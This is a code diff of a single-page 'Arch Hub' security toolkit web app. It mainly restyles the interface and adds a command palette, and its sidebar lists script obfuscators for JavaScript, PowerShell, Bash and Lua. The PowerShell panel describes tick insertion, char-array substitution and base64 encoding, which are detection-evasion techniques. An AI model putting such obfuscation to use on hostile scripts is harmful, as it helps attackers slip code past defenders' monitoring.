@@ -64,6 +64,7 @@ html, body {
   background: var(--bg-1);
   border-bottom: 1px solid var(--border);
   z-index: 10;
+  position: relative;
 }
 .logo {
   display: flex;
@@ -93,7 +94,6 @@ html, body {
   border: 1px solid var(--accent-lo);
   letter-spacing: 0.05em;
 }
-
 .topbar-user {
   display: flex;
   align-items: center;
@@ -103,34 +103,16 @@ html, body {
   border-right: 1px solid var(--border);
 }
 .user-avatar {
-  width: 24px;
-  height: 24px;
-  border-radius: 50%;
+  width: 24px; height: 24px; border-radius: 50%;
   background: linear-gradient(135deg, var(--accent), var(--accent-hi));
-  color: #fff;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 11px;
-  font-weight: 600;
-  font-family: var(--mono);
-  flex-shrink: 0;
+  color: #fff; display: flex; align-items: center; justify-content: center;
+  font-size: 11px; font-weight: 600; font-family: var(--mono); flex-shrink: 0;
 }
-.user-name {
-  font-family: var(--mono);
-  font-size: 12px;
-  color: var(--text-1);
-}
+.user-name { font-family: var(--mono); font-size: 12px; color: var(--text-1); }
 .user-role {
-  font-size: 9px;
-  padding: 1px 6px;
-  border-radius: 3px;
-  background: var(--accent-lo);
-  color: var(--accent-hi);
-  font-family: var(--mono);
-  text-transform: uppercase;
-  letter-spacing: 0.05em;
-  font-weight: 600;
+  font-size: 9px; padding: 1px 6px; border-radius: 3px;
+  background: var(--accent-lo); color: var(--accent-hi);
+  font-family: var(--mono); text-transform: uppercase; letter-spacing: 0.05em; font-weight: 600;
 }
 
 /* ── SIDEBAR ── */
@@ -147,38 +129,34 @@ html, body {
 }
 .sidebar::-webkit-scrollbar { width: 4px; }
 .sidebar::-webkit-scrollbar-thumb { background: var(--bg-4); border-radius: 2px; }
-
 .nav-section {
   padding: 16px 16px 4px;
-  font-size: 9px;
-  font-weight: 600;
-  letter-spacing: 0.12em;
-  text-transform: uppercase;
-  color: var(--text-3);
-  font-family: var(--mono);
+  font-size: 9px; font-weight: 600; letter-spacing: 0.12em;
+  text-transform: uppercase; color: var(--text-3); font-family: var(--mono);
 }
-
 .nav-item {
-  display: flex;
-  align-items: center;
-  gap: 9px;
-  padding: 7px 16px;
-  cursor: pointer;
-  color: var(--text-2);
-  font-size: 13px;
-  font-weight: 400;
+  display: flex; align-items: center; gap: 9px;
+  padding: 7px 16px; cursor: pointer; color: var(--text-2);
+  font-size: 13px; font-weight: 400;
   transition: color 0.12s, background 0.12s;
   border-left: 2px solid transparent;
-  position: relative;
-  user-select: none;
+  position: relative; user-select: none;
+  border-radius: 0 6px 6px 0; margin-right: 8px;
 }
-.nav-item:hover { color: var(--text-1); background: var(--bg-2); }
-.nav-item.active { color: var(--accent-hi); background: var(--bg-2); border-left-color: var(--accent); }
+.nav-item:hover { color: var(--text-1); background: var(--bg-2); transform: translateX(2px); }
+.nav-item.active {
+  color: var(--accent-hi);
+  background: linear-gradient(90deg, rgba(110,86,207,0.2), rgba(110,86,207,0.06));
+  box-shadow: inset 3px 0 0 var(--accent);
+}
 .nav-dot {
   width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0;
   background: var(--text-3); transition: background 0.12s;
 }
-.nav-item.active .nav-dot { background: var(--accent); box-shadow: 0 0 6px var(--accent); }
+.nav-item.active .nav-dot {
+  background: var(--accent);
+  animation: pulse-dot 2.5s ease-in-out infinite;
+}
 .nav-item:hover .nav-dot { background: var(--text-2); }
 
 /* ── MAIN ── */
@@ -202,6 +180,10 @@ html, body {
   from { opacity: 0; transform: translateY(6px); }
   to   { opacity: 1; transform: translateY(0); }
 }
+@keyframes pulse-dot {
+  0%, 100% { box-shadow: 0 0 4px var(--accent); opacity: 1; }
+  50%       { box-shadow: 0 0 10px var(--accent), 0 0 20px var(--accent-glow); opacity: 0.7; }
+}
 
 /* ── PANEL HEADER ── */
 .panel-header { display: flex; align-items: flex-start; gap: 14px; padding-bottom: 16px; border-bottom: 1px solid var(--border); }
@@ -211,11 +193,24 @@ html, body {
   flex-shrink: 0; color: var(--accent-hi);
 }
 .panel-icon svg { width: 18px; height: 18px; }
-.panel-title { font-size: 18px; font-weight: 600; color: var(--text-0); line-height: 1.3; }
+.panel-title { font-size: 18px; font-weight: 600; color: var(--text-0); line-height: 1.3; text-shadow: 0 0 20px rgba(110,86,207,0.3); }
 .panel-desc { font-size: 12px; color: var(--text-2); margin-top: 2px; line-height: 1.5; }
 
 /* ── CARD ── */
-.card { background: var(--bg-1); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
+.card {
+  background: rgba(13, 18, 32, 0.6);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  overflow: hidden;
+  backdrop-filter: blur(12px) saturate(1.4);
+  -webkit-backdrop-filter: blur(12px) saturate(1.4);
+  box-shadow: 0 4px 24px rgba(0,0,0,0.3), inset 0 1px 0 rgba(255,255,255,0.04);
+  transition: border-color 0.2s, box-shadow 0.2s;
+}
+.card:hover {
+  border-color: var(--border-hi);
+  box-shadow: 0 0 0 1px var(--border-hi), 0 4px 32px rgba(110,86,207,0.15), inset 0 1px 0 rgba(255,255,255,0.05);
+}
 .card-head {
   display: flex; align-items: center; justify-content: space-between;
   padding: 10px 14px; border-bottom: 1px solid var(--border); background: var(--bg-2);
@@ -239,18 +234,24 @@ textarea, input[type="text"], input[type="password"], input[type="number"], sele
   outline: none;
   transition: border-color 0.12s;
   caret-color: var(--accent-hi);
+  font-feature-settings: "liga" 0, "calt" 1;
+  -webkit-font-smoothing: antialiased;
+  text-rendering: optimizeLegibility;
 }
-textarea:focus, input[type="text"]:focus, input[type="password"]:focus, input[type="number"]:focus, select:focus {
+textarea:focus, input[type="text"]:focus,
+input[type="password"]:focus, input[type="number"]:focus, select:focus {
   border-color: var(--accent);
-  box-shadow: 0 0 0 2px var(--accent-glow);
+  box-shadow: 0 0 0 2px var(--accent-glow), inset 0 1px 3px rgba(0,0,0,0.3);
+  caret-color: var(--accent-hi);
 }
 textarea { min-height: 140px; }
 select {
   -webkit-appearance: none; appearance: none;
   background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='7' fill='none'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%236e56cf' stroke-width='1.5' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
   background-repeat: no-repeat; background-position: right 10px center;
-  padding-right: 30px; cursor: pointer;
+  padding-right: 30px; cursor: pointer; resize: none;
 }
+select:hover { border-color: var(--border-hi); background-color: var(--bg-2); }
 select option { background: var(--bg-2); }
 
 /* ── BUTTONS ── */
@@ -259,10 +260,16 @@ select option { background: var(--bg-2); }
   border-radius: 5px; border: none; cursor: pointer; font-family: var(--sans);
   font-size: 12.5px; font-weight: 500; transition: all 0.12s;
   text-decoration: none; user-select: none; white-space: nowrap;
+  position: relative; overflow: hidden;
 }
 .btn svg { width: 13px; height: 13px; flex-shrink: 0; }
-.btn-primary { background: var(--accent); color: #fff; }
-.btn-primary:hover { background: var(--accent-hi); }
+.btn::after {
+  content: ''; position: absolute; inset: 0;
+  background: rgba(255,255,255,0.08); opacity: 0; transition: opacity 0.15s;
+}
+.btn:active::after { opacity: 1; }
+.btn-primary { background: var(--accent); color: #fff; box-shadow: 0 0 12px rgba(110,86,207,0.25); }
+.btn-primary:hover { background: var(--accent-hi); box-shadow: 0 0 20px rgba(110,86,207,0.4); }
 .btn-secondary { background: var(--bg-3); color: var(--text-1); border: 1px solid var(--border); }
 .btn-secondary:hover { background: var(--bg-4); color: var(--text-0); border-color: var(--border-hi); }
 .btn-ghost { background: transparent; color: var(--text-2); border: 1px solid transparent; padding: 4px 8px; font-size: 11px; }
@@ -282,7 +289,7 @@ select option { background: var(--bg-2); }
   padding: 8px 12px; border-radius: 5px; font-size: 12px; font-family: var(--mono);
   display: none; align-items: flex-start; gap: 8px; line-height: 1.5;
 }
-.notice.show { display: flex; }
+.notice.show { display: flex; animation: noticeIn 0.2s ease; }
 .notice-ok  { background: rgba(34,197,94,.08);  border: 1px solid rgba(34,197,94,.2);  color: #4ade80; }
 .notice-warn{ background: rgba(245,158,11,.08); border: 1px solid rgba(245,158,11,.2); color: #fbbf24; }
 .notice-err { background: rgba(239,68,68,.08);  border: 1px solid rgba(239,68,68,.2);  color: #f87171; }
@@ -323,8 +330,16 @@ select option { background: var(--bg-2); }
   background: var(--bg-1); border: 1px solid var(--border); border-radius: 8px;
   padding: 16px; cursor: pointer; transition: border-color 0.12s, background 0.12s, transform 0.12s;
   display: flex; flex-direction: column; gap: 8px;
+  position: relative; overflow: hidden;
 }
-.dash-card:hover { border-color: var(--accent); background: var(--bg-2); transform: translateY(-1px); }
+.dash-card::before {
+  content: ''; position: absolute; top: -60%; left: -60%;
+  width: 40%; height: 220%;
+  background: linear-gradient(105deg, transparent 40%, rgba(155,130,243,0.08) 50%, transparent 60%);
+  transform: rotate(-10deg); opacity: 0; transition: opacity 0.3s, left 0.5s;
+}
+.dash-card:hover { border-color: var(--accent); background: var(--bg-2); transform: translateY(-1px); box-shadow: 0 0 20px rgba(110,86,207,0.2), 0 2px 8px rgba(0,0,0,0.3); }
+.dash-card:hover::before { opacity: 1; left: 130%; }
 .dash-card-icon {
   width: 32px; height: 32px; border-radius: 7px; display: flex;
   align-items: center; justify-content: center; color: var(--accent-hi);
@@ -337,196 +352,250 @@ select option { background: var(--bg-2); }
 /* ── HASH GRID ── */
 .hash-row {
   display: grid; grid-template-columns: 60px 1fr auto; gap: 6px;
-  align-items: center; padding: 6px 0; border-bottom: 1px solid var(--border);
+  align-items: center; padding: 6px 4px; border-bottom: 1px solid var(--border);
+  border-radius: 4px; transition: background 0.15s;
 }
 .hash-row:last-child { border-bottom: none; }
+.hash-row:nth-child(even) { background: rgba(110,86,207,0.03); }
+.hash-row:hover { background: rgba(110,86,207,0.08); }
 .hash-name { font-family: var(--mono); font-size: 11px; color: var(--text-2); }
-.hash-val { font-family: var(--mono); font-size: 11px; color: var(--teal); word-break: break-all; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.hash-val {
+  font-family: var(--mono); font-size: 11px; color: var(--teal);
+  word-break: break-all; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
+  font-feature-settings: "liga" 0, "calt" 1;
+}
 
 /* ── FOOTER ── */
 .sidebar-footer { margin-top: auto; padding: 12px 16px 0; border-top: 1px solid var(--border); }
 .sidebar-footer-text { font-size: 10px; color: var(--text-3); font-family: var(--mono); line-height: 1.6; }
 
-/* ══════════════════════════════════════════
-   AUTH SCREEN
-   ══════════════════════════════════════════ */
+/* ── ANIMATED TOPBAR LINE ── */
+.topbar::after {
+  content: ''; position: absolute; bottom: 0; left: 0; right: 0; height: 1px;
+  background: linear-gradient(90deg, transparent 0%, var(--accent) 30%, var(--teal) 60%, transparent 100%);
+  background-size: 200% 100%; animation: shimBar 4s linear infinite; opacity: 0.6;
+}
+@keyframes shimBar {
+  0%   { background-position: 200% 0; }
+  100% { background-position: -200% 0; }
+}
+
+/* ── SCAN-LINE OVERLAY ── */
+.shell::before {
+  content: ''; position: fixed; inset: 0;
+  background-image: repeating-linear-gradient(0deg, rgba(0,0,0,0.03) 0px, rgba(0,0,0,0.03) 1px, transparent 1px, transparent 2px);
+  pointer-events: none; z-index: 999;
+}
+
+/* ══════ AUTH SCREEN ══════ */
 .auth-screen {
-  position: fixed;
-  inset: 0;
-  background: var(--bg-0);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  z-index: 1000;
-  padding: 20px;
-  overflow-y: auto;
+  position: fixed; inset: 0; background: var(--bg-0);
+  display: flex; align-items: center; justify-content: center;
+  z-index: 1000; padding: 20px; overflow-y: auto;
   background-image:
     radial-gradient(circle at 15% 20%, rgba(110,86,207,0.12), transparent 45%),
     radial-gradient(circle at 85% 80%, rgba(45,212,191,0.07), transparent 45%);
 }
 .auth-screen.hidden { display: none; }
+.auth-screen::before, .auth-screen::after {
+  content: ''; position: fixed; border-radius: 50%;
+  filter: blur(80px); pointer-events: none;
+  animation: floatGlow 8s ease-in-out infinite alternate;
+}
+.auth-screen::before { width: 400px; height: 400px; background: rgba(110,86,207,0.08); top: -100px; left: -100px; }
+.auth-screen::after { width: 300px; height: 300px; background: rgba(45,212,191,0.06); bottom: -80px; right: -80px; animation-direction: alternate-reverse; }
+@keyframes floatGlow { from { transform: translate(0,0) scale(1); } to { transform: translate(30px,20px) scale(1.1); } }
 
 .auth-card {
-  width: 100%;
-  max-width: 400px;
-  background: var(--bg-1);
-  border: 1px solid var(--border);
-  border-radius: 12px;
+  width: 100%; max-width: 400px;
+  background: rgba(13,18,32,0.75);
+  border: 1px solid var(--border); border-radius: 12px;
   padding: 32px 28px 24px;
   box-shadow: 0 24px 80px rgba(0,0,0,0.5), 0 0 0 1px rgba(110,86,207,0.08);
+  backdrop-filter: blur(20px) saturate(1.6);
+  -webkit-backdrop-filter: blur(20px) saturate(1.6);
   animation: authIn 0.25s ease;
 }
-@keyframes authIn {
-  from { opacity: 0; transform: translateY(10px) scale(0.99); }
-  to   { opacity: 1; transform: translateY(0) scale(1); }
-}
+@keyframes authIn { from { opacity:0; transform:translateY(10px) scale(0.99); } to { opacity:1; transform:translateY(0) scale(1); } }
 
 .auth-logo {
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  gap: 10px;
-  font-family: var(--mono);
-  font-size: 20px;
-  font-weight: 600;
-  letter-spacing: -0.01em;
-  color: var(--text-0);
-  margin-bottom: 6px;
+  display: flex; align-items: center; justify-content: center; gap: 10px;
+  font-family: var(--mono); font-size: 20px; font-weight: 600;
+  letter-spacing: -0.01em; color: var(--text-0); margin-bottom: 6px;
 }
 .auth-logo-icon { width: 28px; height: 28px; flex-shrink: 0; }
 .auth-logo-icon svg { width: 100%; height: 100%; }
-
 .auth-tagline {
-  text-align: center;
-  font-size: 10px;
-  color: var(--text-3);
-  letter-spacing: 0.14em;
-  text-transform: uppercase;
-  font-family: var(--mono);
-  margin-bottom: 26px;
+  text-align: center; font-size: 10px; color: var(--text-3);
+  letter-spacing: 0.14em; text-transform: uppercase;
+  font-family: var(--mono); margin-bottom: 26px;
 }
-
 .auth-tabs {
-  display: flex;
-  gap: 4px;
-  background: var(--bg-2);
-  padding: 4px;
-  border-radius: 8px;
-  margin-bottom: 22px;
-  border: 1px solid var(--border);
+  display: flex; gap: 4px; background: var(--bg-2); padding: 4px;
+  border-radius: 8px; margin-bottom: 22px; border: 1px solid var(--border);
 }
 .auth-tab {
-  flex: 1;
-  padding: 8px;
-  background: transparent;
-  border: none;
-  color: var(--text-2);
-  font-family: var(--sans);
-  font-size: 13px;
-  font-weight: 500;
-  cursor: pointer;
-  border-radius: 5px;
-  transition: all 0.15s;
+  flex: 1; padding: 8px; background: transparent; border: none;
+  color: var(--text-2); font-family: var(--sans); font-size: 13px;
+  font-weight: 500; cursor: pointer; border-radius: 5px; transition: all 0.15s;
 }
 .auth-tab:hover { color: var(--text-1); }
 .auth-tab.active { background: var(--bg-4); color: var(--text-0); }
-
-.form-group {
-  display: flex;
-  flex-direction: column;
-  gap: 6px;
-  margin-bottom: 14px;
-}
+.form-group { display: flex; flex-direction: column; gap: 6px; margin-bottom: 14px; }
 .form-group label {
-  font-size: 10px;
-  font-weight: 600;
-  color: var(--text-2);
-  font-family: var(--mono);
-  letter-spacing: 0.08em;
-  text-transform: uppercase;
+  font-size: 10px; font-weight: 600; color: var(--text-2);
+  font-family: var(--mono); letter-spacing: 0.08em; text-transform: uppercase;
 }
 .form-group input {
-  width: 100%;
-  padding: 10px 12px;
-  background: var(--bg-0);
-  border: 1px solid var(--border);
-  border-radius: 6px;
-  color: var(--text-0);
-  font-family: var(--sans);
-  font-size: 13px;
-  outline: none;
+  width: 100%; padding: 10px 12px; background: var(--bg-0);
+  border: 1px solid var(--border); border-radius: 6px; color: var(--text-0);
+  font-family: var(--sans); font-size: 13px; outline: none;
   transition: border-color 0.15s, box-shadow 0.15s;
 }
-.form-group input:focus {
-  border-color: var(--accent);
-  box-shadow: 0 0 0 3px var(--accent-glow);
-}
-.form-group input::placeholder {
-  color: var(--text-3);
-}
-
-.auth-error {
-  min-height: 16px;
-  font-size: 11.5px;
-  color: #f87171;
-  font-family: var(--mono);
-  margin-bottom: 10px;
-  line-height: 1.4;
-}
+.form-group input:focus { border-color: var(--accent); box-shadow: 0 0 0 3px var(--accent-glow); }
+.form-group input::placeholder { color: var(--text-3); }
+.auth-error { min-height: 16px; font-size: 11.5px; color: #f87171; font-family: var(--mono); margin-bottom: 10px; line-height: 1.4; }
 .auth-error.ok { color: #4ade80; }
-
-.auth-submit {
-  width: 100%;
-  justify-content: center;
-  padding: 11px;
-  font-size: 13px;
-  font-weight: 600;
-}
-
-/* Google 登录按钮专属样式 */
+.auth-submit { width: 100%; justify-content: center; padding: 11px; font-size: 13px; font-weight: 600; }
 .btn-google {
-  background: #ffffff;
-  color: #333333;
-  width: 100%;
-  justify-content: center;
-  padding: 11px;
-  font-size: 13px;
-  font-weight: 600;
-  gap: 10px;
+  background: #ffffff; color: #333333; width: 100%;
+  justify-content: center; padding: 11px; font-size: 13px; font-weight: 600; gap: 10px;
 }
-.btn-google:hover {
-  background: #f1f1f1;
-}
-
+.btn-google:hover { background: #f1f1f1; }
 .auth-note {
-  margin-top: 20px;
-  padding-top: 16px;
-  border-top: 1px solid var(--border);
-  font-size: 10px;
-  color: var(--text-3);
-  text-align: center;
-  font-family: var(--mono);
-  line-height: 1.7;
+  margin-top: 20px; padding-top: 16px; border-top: 1px solid var(--border);
+  font-size: 10px; color: var(--text-3); text-align: center;
+  font-family: var(--mono); line-height: 1.7;
 }
 .auth-note strong { color: var(--text-2); font-weight: 500; }
 
-/* ── RESPONSIVE ── */
+/* ══════ COMMAND PALETTE ══════ */
+.cmd-overlay {
+  display: none; position: fixed; inset: 0;
+  background: rgba(0,0,0,.55); z-index: 2000;
+  backdrop-filter: blur(4px); -webkit-backdrop-filter: blur(4px);
+  align-items: flex-start; justify-content: center;
+  padding-top: 15vh;
+}
+.cmd-overlay.open { display: flex; }
+.cmd-box {
+  width: 100%; max-width: 480px;
+  background: var(--bg-1); border: 1px solid var(--border-hi);
+  border-radius: 10px; overflow: hidden;
+  box-shadow: 0 24px 80px rgba(0,0,0,.6);
+}
+.cmd-input-wrap {
+  display: flex; align-items: center; gap: 10px;
+  padding: 12px 16px; border-bottom: 1px solid var(--border);
+}
+.cmd-input-wrap svg { flex-shrink: 0; color: var(--text-3); width: 16px; height: 16px; }
+#cmd-search {
+  flex: 1; background: none; border: none; outline: none;
+  font-family: var(--sans); font-size: 15px; color: var(--text-0);
+  caret-color: var(--accent-hi);
+}
+#cmd-search::placeholder { color: var(--text-3); }
+.cmd-hint { font-family: var(--mono); font-size: 10px; color: var(--text-3); }
+.cmd-results { max-height: 320px; overflow-y: auto; padding: 6px; }
+.cmd-item {
+  display: flex; align-items: center; gap: 10px;
+  padding: 9px 12px; border-radius: 6px; cursor: pointer;
+  color: var(--text-1); font-size: 13px; transition: background .1s;
+}
+.cmd-item:hover, .cmd-item.selected { background: var(--bg-3); color: var(--text-0); }
+.cmd-item-cat {
+  margin-left: auto; font-family: var(--mono); font-size: 10px;
+  color: var(--text-3); text-transform: uppercase; letter-spacing: .06em;
+}
+.cmd-empty { padding: 20px; text-align: center; color: var(--text-3); font-size: 13px; }
+
+/* ══════ PRODUCTION FALLBACKS ══════ */
+:root { color-scheme: dark; }
+
+input:-webkit-autofill,
+input:-webkit-autofill:hover,
+input:-webkit-autofill:focus {
+  -webkit-text-fill-color: var(--text-0);
+  -webkit-box-shadow: 0 0 0 1000px var(--bg-0) inset;
+  caret-color: var(--text-0);
+  transition: background-color 9999s ease-in-out 0s;
+}
+
+html, body, .shell { height: 100dvh; }
+
+::selection { background: rgba(110,86,207,.45); color: #fff; }
+::placeholder { color: var(--text-3); opacity: 1; }
+:focus-visible { outline: 2px solid var(--accent-hi); outline-offset: 2px; }
+textarea:focus-visible, input:focus-visible, select:focus-visible { outline: none; }
+
+@media (prefers-reduced-motion: reduce) {
+  *, *::before, *::after {
+    animation-duration: .01ms !important;
+    transition-duration: .01ms !important;
+    animation-iteration-count: 1 !important;
+  }
+}
+
+@supports not (backdrop-filter: blur(1px)) {
+  .card { background: var(--bg-1); }
+}
+
+/* ══════ MOBILE NAV ══════ */
 @media (max-width: 700px) {
-  .shell { grid-template-columns: 1fr; grid-template-rows: 48px auto 1fr; }
-  .sidebar { display: none; }
-  .main { padding: 20px 16px; }
-  .topbar-user .user-name { display: none; }
+  .shell {
+    grid-template-columns: 1fr;
+    grid-template-rows: 48px auto 1fr;
+  }
+  .sidebar {
+    display: flex !important;
+    flex-direction: row;
+    overflow-x: auto;
+    overflow-y: hidden;
+    padding: 6px 10px;
+    gap: 4px;
+    border-right: none;
+    border-bottom: 1px solid var(--border);
+    scrollbar-width: none;
+    max-height: 48px;
+  }
+  .sidebar::-webkit-scrollbar { display: none; }
+  .nav-section,
+  .sidebar-footer,
+  .nav-dot { display: none !important; }
+  .nav-item {
+    flex: 0 0 auto;
+    padding: 5px 11px;
+    border-left: none;
+    border-radius: 20px;
+    white-space: nowrap;
+    font-size: 12px;
+    margin-right: 0;
+    transform: none !important;
+    box-shadow: none;
+  }
+  .nav-item.active {
+    background: var(--bg-4);
+    box-shadow: 0 0 0 1px var(--accent) !important;
+    color: var(--accent-hi);
+  }
+  .main { padding: 16px 12px; padding-bottom: calc(32px + env(safe-area-inset-bottom, 0px)); }
+  .topbar { padding: 0 12px; gap: 8px; }
+  .logo-sub, .logo-sep, .topbar-badge { display: none; }
+  input, textarea, select, .form-group input { font-size: 16px; }
+  .topbar { padding-top: env(safe-area-inset-top, 0px); height: calc(48px + env(safe-area-inset-top, 0px)); }
+}
+
+@keyframes noticeIn {
+  from { opacity: 0; transform: translateY(-6px); }
+  to   { opacity: 1; transform: translateY(0); }
 }
 </style>
 </head>
 <body>
 
-<!-- ══════════════════════════════════════════
-     AUTH SCREEN
-     ══════════════════════════════════════════ -->
+<!-- AUTH SCREEN -->
 <div class="auth-screen" id="auth-screen">
   <div class="auth-card">
-
     <div class="auth-logo">
       <div class="auth-logo-icon">
         <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
@@ -538,13 +607,10 @@ select option { background: var(--bg-2); }
       Arch Hub
     </div>
     <div class="auth-tagline">Security Toolkit</div>
-
     <div class="auth-tabs">
       <button class="auth-tab active" data-tab="login" onclick="switchAuthTab('login')">Sign In</button>
       <button class="auth-tab" data-tab="register" onclick="switchAuthTab('register')">Register</button>
     </div>
-
-    <!-- LOGIN FORM -->
     <form id="login-form" class="auth-form" onsubmit="handleLogin(event)">
       <div class="form-group">
         <label for="login-user">Username</label>
@@ -557,16 +623,12 @@ select option { background: var(--bg-2); }
       <div class="auth-error" id="login-error"></div>
       <button type="submit" class="btn btn-primary auth-submit">Sign In</button>
     </form>
-
-    <!-- REGISTER FORM (GOOGLE OAUTH SIMULATION) -->
     <div id="register-form" class="auth-form" style="display:none;">
-      <div style="text-align: center; margin-bottom: 24px;">
-        <div style="font-size: 14px; font-weight: 600; color: var(--text-0); margin-bottom: 8px;">Create your account</div>
-        <div style="font-size: 12px; color: var(--text-2);">To continue to Arch Hub, please authorize with your Google account.</div>
+      <div style="text-align:center;margin-bottom:24px;">
+        <div style="font-size:14px;font-weight:600;color:var(--text-0);margin-bottom:8px;">Create your account</div>
+        <div style="font-size:12px;color:var(--text-2);">To continue to Arch Hub, please authorize with your Google account.</div>
       </div>
-      
       <button type="button" class="btn btn-google" onclick="handleGoogleLogin()">
-        <!-- Google G Icon SVG -->
         <svg width="18" height="18" viewBox="0 0 48 48">
           <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
           <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
@@ -575,9 +637,8 @@ select option { background: var(--bg-2); }
         </svg>
         Continue with Google
       </button>
-      <div class="auth-error" id="reg-error" style="margin-top: 14px; text-align: center;"></div>
+      <div class="auth-error" id="reg-error" style="margin-top:14px;text-align:center;"></div>
     </div>
-
     <div class="auth-note">
       <strong>Client-side authentication</strong><br>
       Credentials are stored locally in this browser.
@@ -585,12 +646,23 @@ select option { background: var(--bg-2); }
   </div>
 </div>
 
-<!-- ══════════════════════════════════════════
-     APP SHELL
-     ══════════════════════════════════════════ -->
+<!-- COMMAND PALETTE -->
+<div class="cmd-overlay" id="cmd-overlay" onclick="cmdClose(event)">
+  <div class="cmd-box">
+    <div class="cmd-input-wrap">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/>
+      </svg>
+      <input id="cmd-search" placeholder="Search tools…" autocomplete="off" oninput="cmdFilter()" onkeydown="cmdKey(event)">
+      <span class="cmd-hint">ESC to close</span>
+    </div>
+    <div class="cmd-results" id="cmd-results"></div>
+  </div>
+</div>
+
+<!-- APP SHELL -->
 <div class="shell" id="app-shell" style="display:none;">
 
-<!-- TOPBAR -->
 <header class="topbar">
   <div class="logo" onclick="navigate('home')">
     <div class="logo-icon">
@@ -605,55 +677,53 @@ select option { background: var(--bg-2); }
     <span class="logo-sub">Security Toolkit</span>
   </div>
   <div class="topbar-spacer"></div>
+  <button class="btn btn-ghost" onclick="cmdOpen()" title="Ctrl+K" style="font-family:var(--mono);font-size:11px;gap:6px;border-color:var(--border);">
+    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+      <circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/>
+    </svg>
+    <span>⌘K</span>
+  </button>
   <div class="topbar-user" id="topbar-user">
     <div class="user-avatar" id="user-avatar">?</div>
     <span class="user-name" id="user-name">—</span>
     <span class="user-role" id="user-role">USER</span>
     <button class="btn btn-ghost" onclick="logout()">Sign out</button>
   </div>
-  <div class="topbar-badge">v2.4.1</div>
+  <div class="topbar-badge">v2.5.0</div>
 </header>
 
-<!-- SIDEBAR -->
 <nav class="sidebar">
   <div class="nav-section">Overview</div>
   <div class="nav-item active" onclick="navigate('home')"><div class="nav-dot"></div> Dashboard</div>
-
   <div class="nav-section">Obfuscators</div>
   <div class="nav-item" onclick="navigate('js-obf')"><div class="nav-dot"></div> JavaScript</div>
   <div class="nav-item" onclick="navigate('ps-obf')"><div class="nav-dot"></div> PowerShell</div>
   <div class="nav-item" onclick="navigate('bash-obf')"><div class="nav-dot"></div> Bash / Shell</div>
   <div class="nav-item" onclick="navigate('lua-obf')"><div class="nav-dot"></div> Lua</div>
-
   <div class="nav-section">Encode / Decode</div>
   <div class="nav-item" onclick="navigate('base64')"><div class="nav-dot"></div> Base64</div>
   <div class="nav-item" onclick="navigate('url-enc')"><div class="nav-dot"></div> URL Encode</div>
   <div class="nav-item" onclick="navigate('hex-enc')"><div class="nav-dot"></div> Hex</div>
   <div class="nav-item" onclick="navigate('html-enc')"><div class="nav-dot"></div> HTML Entity</div>
-
   <div class="nav-section">Ciphers</div>
   <div class="nav-item" onclick="navigate('xor')"><div class="nav-dot"></div> XOR Cipher</div>
   <div class="nav-item" onclick="navigate('rot')"><div class="nav-dot"></div> ROT13 / ROT-N</div>
   <div class="nav-item" onclick="navigate('caesar')"><div class="nav-dot"></div> Caesar Cipher</div>
-
   <div class="nav-section">Hashing</div>
   <div class="nav-item" onclick="navigate('hash')"><div class="nav-dot"></div> Hash Generator</div>
-
   <div class="nav-section">Utilities</div>
   <div class="nav-item" onclick="navigate('string-tools')"><div class="nav-dot"></div> String Tools</div>
   <div class="nav-item" onclick="navigate('charcode')"><div class="nav-dot"></div> Char Code</div>
   <div class="nav-item" onclick="navigate('diff')"><div class="nav-dot"></div> Text Diff</div>
   <div class="nav-item" onclick="navigate('regex')"><div class="nav-dot"></div> Regex Tester</div>
-
   <div class="sidebar-footer">
     <div class="sidebar-footer-text">All processing<br>runs client-side.</div>
   </div>
 </nav>
 
-<!-- MAIN -->
 <main class="main" id="main-area">
 
-<!-- ══════════════ DASHBOARD ══════════════ -->
+<!-- DASHBOARD -->
 <div class="tool-panel active" id="home-panel">
   <div class="panel-header">
     <div class="panel-icon">
@@ -670,7 +740,7 @@ select option { background: var(--bg-2); }
   <div class="dash-grid" id="dash-grid"></div>
 </div>
 
-<!-- ══════════════ JS OBFUSCATOR ══════════════ -->
+<!-- JS OBFUSCATOR -->
 <div class="tool-panel" id="js-obf-panel">
   <div class="panel-header">
     <div class="panel-icon">
@@ -727,7 +797,7 @@ select option { background: var(--bg-2); }
   </div>
 </div>
 
-<!-- ══════════════ POWERSHELL OBFUSCATOR ══════════════ -->
+<!-- POWERSHELL OBFUSCATOR -->
 <div class="tool-panel" id="ps-obf-panel">
   <div class="panel-header">
     <div class="panel-icon">
@@ -738,7 +808,7 @@ select option { background: var(--bg-2); }
     </div>
     <div>
       <div class="panel-title">PowerShell Obfuscator</div>
-      <div class="panel-desc">Tick insertion · char-array substitution · base64 encoding · case randomisation</div>
+      <div class="panel-desc">Tick insertion · char-array substitution · base64 encoding (UTF-16LE) · case randomisation</div>
     </div>
   </div>
   <div class="card">
@@ -759,7 +829,7 @@ select option { background: var(--bg-2); }
         <select id="ps-method">
           <option value="tick">Tick insertion (backtick junk)</option>
           <option value="char">Char array ([char]0x49+[char]0x45+…)</option>
